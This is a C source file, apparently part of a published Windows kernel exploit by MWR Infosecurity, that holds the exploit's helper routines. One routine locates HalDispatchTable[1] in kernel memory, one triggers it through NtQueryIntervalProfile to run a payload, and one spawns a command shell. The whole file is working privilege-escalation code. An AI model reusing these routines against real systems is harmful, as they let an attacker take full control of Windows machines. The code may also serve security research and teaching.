#include "stdafx.h"

/*
MWR Infosecurity
Jeremy Fetiveau
August 2014
*/

NtQueryIntervalProfile_t NtQueryIntervalProfile;

/*
Here is the code containing miscellaneous utilities to find the HalDispatchTable,
spawn a console and call HalDispatchTable[1]
*/

PVOID getHalAndMisc()
{
	HMODULE h, kernel;
	PUCHAR hal;
	PVOID kernelBase;
	ULONG len;
	NTSTATUS st;
	PSYSTEM_MODULE_INFORMATION sysInfo;
	PCHAR kernelImage;

	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, NULL, 0, &len);

	sysInfo = (PSYSTEM_MODULE_INFORMATION)malloc(len);

	if (!sysInfo) {
		printf("[-]Failed to allocate memory for system module information\n");
		exit(1);
	}

	st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, sysInfo, len, &len);

	if (!NT_SUCCESS(st)) {
		printf("[-]Failed to get system module informations\n");
		exit(1);
	}

	kernelBase = sysInfo->Module[0].Base;
	kernelImage = strrchr((char*)(sysInfo->Module[0].ImageName), '\\') + 1;

	kernel = LoadLibraryA(kernelImage);
	if (!kernel) {
		printf("[-]Failed to load kernel base\n");
		exit(1);
	}

	hal = (PUCHAR)GetProcAddress(kernel, "HalDispatchTable");

	if (!hal) {
		printf("[-]Failed to find HalDispatchTable\n");
		exit(1);
	}


	hal = (PUCHAR)hal - (PUCHAR)kernel + (PUCHAR)kernelBase;

	return (PVOID)((PUCHAR)hal + sizeof(PVOID));
}

void callPayload()
{
	HMODULE h;
	ULONG foo;

	h = LoadLibraryA("ntdll.dll");

	if (!h) {
		printf("[-]Failed to load module\n");
		exit(1);
	}

	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(h, "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		printf("[-]Failed to get the address of NtQueryIntervalProfile\n");
		exit(1);
	}

	NtQueryIntervalProfile(2, &foo);

}

void spawnShell()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	char str[] = "cmd";

	if (!CreateProcessA(NULL,
		str,
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,              
		NULL,           
		NULL,           
		&si,            
		&pi)           
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}
}